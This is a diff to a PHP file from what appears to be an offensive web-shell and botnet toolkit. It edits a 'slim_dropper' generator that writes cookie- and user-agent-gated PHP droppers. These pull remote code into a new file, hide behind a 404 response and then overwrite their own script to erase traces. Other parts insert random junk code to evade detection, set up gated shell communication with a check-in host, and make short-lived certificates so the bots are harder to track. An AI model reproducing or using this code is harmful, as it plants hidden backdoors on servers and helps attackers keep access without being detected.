@@ -1,29 +1,39 @@
 <?php
 const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-const special  = '~!@#%^&*(){}[],./?';
+const special = '~!@#%^&*(){}[],./?';
 const disallowed = '1234567890';
 const allowed_chars = alpha;
 
 class dynamic_generator
 {
-    function slim_dropper(string $caller, string $filename, bool $randomize){
-        if ($randomize === true && !empty($caller)){
-            if (empty($filename)){
-                $filename = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
-                $cookieName = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
-                $randomized_ua = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
-                $post_variable = substr(allowed_chars,0, rand(1,5)).bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
-                $post_value = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+    function slim_dropper(string $caller, string $filename, bool $randomize)
+    {
+        if ($randomize === true && !empty($caller)) {
+            if (empty($filename)) {
+                $filename = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
+                $cookieName = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
+                $randomized_ua = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
+                $post_variable = substr(allowed_chars, rand(0, 7), rand(1, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
+                $post_value = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
                 $slim = file('includes/templates/base_template.php');
-                $do_hash = hash_hmac('sha256',$post_value.'.'.$caller, $post_value);
-                $final = base64_encode(serialize($do_hash.'.'.$post_value.'.'.$caller.'?r=pull'));
+                $do_hash = hash_hmac('sha256', $post_value . '.' . $caller . '?r=pull', $post_value);
+                $final = base64_encode(serialize($do_hash . '.' . $post_value . '.' . $caller . '?r=pull'));
+                $random_data_var = substr(allowed_chars, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 10)));
                 $dr = <<<SLIMM
 http_response_code(404);
 if (isset(\$_COOKIE['$cookieName']) && \$_SERVER['HTTP_USER_AGENT'] === '$randomized_ua'){
     if (isset(\$_POST['$post_variable'])){
         \$$post_variable = explode('.', unserialize(base64_decode(\$_COOKIE['$cookieName']), ['allowed_classes' => false]));
         if ( hash_equals(hash_hmac('sha256', \$_COOKIE['$cookieName'], \${$post_variable}[0]), \${$post_variable}[1]) ){
-            fputs(fopen('./$filename.php', 'a+'),file_get_contents("\${$post_variable}[2]"));
+            if (function_exists("com_create_guid") === true){
+                echo trim(com_create_guid()).PHP_EOL.PHP_EOL;
+            }else{
+                \$$random_data_var = openssl_random_pseudo_bytes(16);
+                \${$random_data_var}[6] = chr(ord(\${$random_data_var}[6]) & 0x0f | 0x40);
+                \${$random_data_var}[8] = chr(ord(\${$random_data_var}[8]) & 0x3f | 0x80);
+                echo vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(\$$random_data_var), 4)).PHP_EOL.PHP_EOL;
+            }
+            fputs(fopen('./$filename.php', 'a+'),file_get_contents(\${$post_variable}[2]));
             foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
                 fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
             }
@@ -38,7 +48,7 @@ if (isset(\$_COOKIE['$cookieName']) && \$_SERVER['HTTP_USER_AGENT'] === '$random
     die();
 }
 SLIMM;
-                $push_out = 'includes/droppers/dynamic/slim/'.bin2hex(openssl_random_pseudo_bytes(rand(4,15))).'.php';
+                $push_out = 'includes/droppers/dynamic/slim/' . bin2hex(openssl_random_pseudo_bytes(rand(4, 15))) . '.php';
                 $to_out = fopen($push_out, 'a+');
                 fwrite($to_out, (string)$slim[0]);
                 fwrite($to_out, $dr);
@@ -53,49 +63,70 @@ SLIMM;
                 );
                 return true;
             }
-        }else{
+        } else {
             return false;
         }
         return false;
     }
-    private function genCert(int $CertStrength, string $certAlgo, string $keyType, string $digest, array $common)
+
+    function genCert(int $CertStrength, string $certAlgo, string $keyType, string $digest, array $common)
     {
+        $out = new StdClass;
+        // with few alterations, I drew inspiration to use this method to derive a self signed cert from this stack post:
+        //https://stackoverflow.com/questions/57034087/how-do-i-generate-a-self-signed-certificate-using-php-and-openssl#57046648
         if (!is_null($CertStrength) and is_int($CertStrength) and !is_null($certAlgo) and count($common) > 0) {
-            if ($CertStrength < 4096) {
-                echo "Are you sure you want such a small cert?\n";
-                echo "This is for client auth and mutual tls, make sure its a bit higher.\n";
-                return 0;
-            } else {
-                switch (strpos($keyType, "curve") or strpos($keyType, "prime") or strpos($keyType, "secp")) {
-                    case true:
-                        $keyInfo = array(
-                            "private_key_type" => OPENSSL_KEYTYPE_EC,
-                            "curve_name" => $keyType
-                        );
-                        break;
-                    default:
-                        $keyInfo = array(
-                            "private_key_type" => $keyType,
-                            "private_key_bits" => (int)$CertStrength
-                        );
-                        break;
-                }
-                $privKey = openssl_pkey_new($keyInfo);
-                $csr = openssl_csr_new($common, $privKey, array("digest_alg" => $digest));
-                $x509 = openssl_csr_sign($csr, null, $privKey, 365, array("digest_alg" => $digest));
-                openssl_csr_export_to_file($csr, "YOURCSR.csr");
-                openssl_x509_export_to_file($x509, "YOURX509CERT.crt");
-                openssl_pkey_export_to_file($privKey, "YOURPRIVKEY.pem");
-                echo "It is very important for you to know these are not password protected.\n";
-                while (($e = openssl_error_string()) !== false) {
-                    echo $e . "\n";
-                }
-                return array(
-                    "Private Key" => base64_encode($privKey),
-                    "CSR" => base64_encode($csr),
-                    "X509" => base64_encode($x509)
-                );
+            if ($CertStrength < 2048) {
+                echo "Going with higher bits... setting to 8096" . PHP_EOL;
+                $CertStrength = 4096;
             }
+            $cert_types = array(
+                "rsa" => OPENSSL_KEYTYPE_RSA,
+                "dsa" => OPENSSL_KEYTYPE_DSA,
+                "ec" => OPENSSL_KEYTYPE_EC,
+                "dh" => OPENSSL_KEYTYPE_DH
+            );
+            $days = 60; // defaulting to 60 days, this can help keep certs fresh and prevent the certs being tracked to a degree, the issue is going to be signaling to our "bots" to update the cert they are tracking.
+            // should be simple enough to recurse through the db sending an update signal to the bots.
+            $cert_confg = array(
+                'digest_alg' => 'sha512',
+                'private_key_bits' => $CertStrength,
+                'private_key_type' => $cert_types[strtolower($certAlgo)],
+                'encrypt_key' => true
+            );
+            $d = 'includes/crypto/certs/';
+            $common = array_merge($common);
+            $privkey = openssl_pkey_new($cert_confg);
+            $csr = openssl_csr_new($common, $privkey, $cert_confg);
+            $cert = openssl_csr_sign($csr, null, $privkey, $days, $cert_confg, 0);
+            $priv_pass = trim(readline("Enter unique password here... if you do not want a password, press enter."));
+            if (empty($priv_pass)){
+                $priv_pass= bin2hex(openssl_random_pseudo_bytes(36));
+            }
+            openssl_x509_export($cert, $out->pub);
+            openssl_pkey_export($privkey,  $out->priv);
+            openssl_csr_export($csr, $out->csr);
+            $filename = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
+            $priv_path = $d."private/{$filename}.key";
+            $cert_path = $d."public/{$filename}.crt";
+            $csr_path = $d."public/{$filename}.csr";
+            $pem_path = $d."public/{$filename}.pem";
+            openssl_pkey_export_to_file($privkey, $priv_path, $priv_pass, $cert_confg);
+            file_put_contents($cert_path, $out->pub, FILE_TEXT);
+            file_put_contents($csr_path, $out->csr, FILE_TEXT);
+            file_put_contents($pem_path, $out->priv, FILE_TEXT);
+            echo str_repeat("-", 30).PHP_EOL;
+            echo "All of your certs reside here: ".PHP_EOL;
+            echo system("ls -lahR {$d}").PHP_EOL;
+            echo str_repeat("-", 30).PHP_EOL;
+            pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, cipher, encrypted, priv_key_password) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s')",
+            $d.$priv_path,
+            base64_encode($out->priv),
+            base64_encode($out->csr),
+            base64_encode($out->pub),
+            $certAlgo.":".$cert_confg['private_key_bits'],
+            $cert_confg['encrypt_key'],
+            $priv_pass
+            ));
         } else {
             throw new ErrorException("Missing Needed information. {$CertStrength} - {$certAlgo}");
         }
@@ -192,13 +223,13 @@ SLEEPER2;
             case 0:
                 $a = "function " . $f_name . "(string \$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "){\n";
                 for ($i = 0; $i <= rand(1, 15); $i++) {
-                    $a .= "\t\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = \"" . substr(str_shuffle(allowed_chars.special), 0, rand(25, 70)) . "\";\n";
+                    $a .= "\t\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = \"" . substr(str_shuffle(allowed_chars . special), 0, rand(25, 70)) . "\";\n";
                 }
                 $a .= "\treturn false;\n}\n\n";
                 $a .= "{$f_name}('" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "');\n";
                 break;
             case 1 | 3 | 5 | 7 | 9:
-                $a = "\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = \"" .substr(str_shuffle(allowed_chars.special), 0, rand(1,5)) . "\";\n";
+                $a = "\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = \"" . substr(str_shuffle(allowed_chars . special), 0, rand(1, 5)) . "\";\n";
                 break;
             case 2 | 4 | 6 | 8 | 10:
                 $a = "define('" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "', \"" . substr(str_shuffle(allowed_chars), 0, rand(3, 5)) . "\");\n";
@@ -214,9 +245,9 @@ SLEEPER2;
                 break;
             case 13:
                 $obfs_tmp = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 15)));
-                $a = "\$" . $obfs_tmp . " = tmpfile();\nfwrite(\$" . $obfs_tmp . ",\"" . substr(str_shuffle(allowed_chars.special), 0, rand(3, 5)) . "\");\n";
+                $a = "\$" . $obfs_tmp . " = tmpfile();\nfwrite(\$" . $obfs_tmp . ",\"" . substr(str_shuffle(allowed_chars . special), 0, rand(3, 5)) . "\");\n";
                 for ($i = 0; $i <= rand(1, 10); $i++) {
-                    $a .= "fwrite(\$" . $obfs_tmp . ", \"" . base64_encode(substr(str_shuffle(allowed_chars.special), 0, rand(3, 5))) . "\");\n";
+                    $a .= "fwrite(\$" . $obfs_tmp . ", \"" . base64_encode(substr(str_shuffle(allowed_chars . special), 0, rand(3, 5))) . "\");\n";
                 }
                 $a .= "fseek(\$" . $obfs_tmp . ", 0);\n";
                 $a .= "\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = file(\$" . $obfs_tmp . ");\n";
@@ -355,10 +386,10 @@ SLEEPER2;
             }
             $cName = trim(readline("[ !! ] Need to set a cookie name, if this field is left blank it will be randomly generated. [ !! ]\n->"));
             $cValue = trim(readline("[ !! ] Need a unique value that the cookie will need to be set to in order for the shell to accept communication from the client\nIf blank it will be randomized. [ !! ]\n->"));
-            if (empty($cName)){
+            if (empty($cName)) {
                 $cName = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
             }
-            if (empty($cValue)){
+            if (empty($cValue)) {
                 $cValue = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 10)));
             }
             $la[240] = $checkInHost;
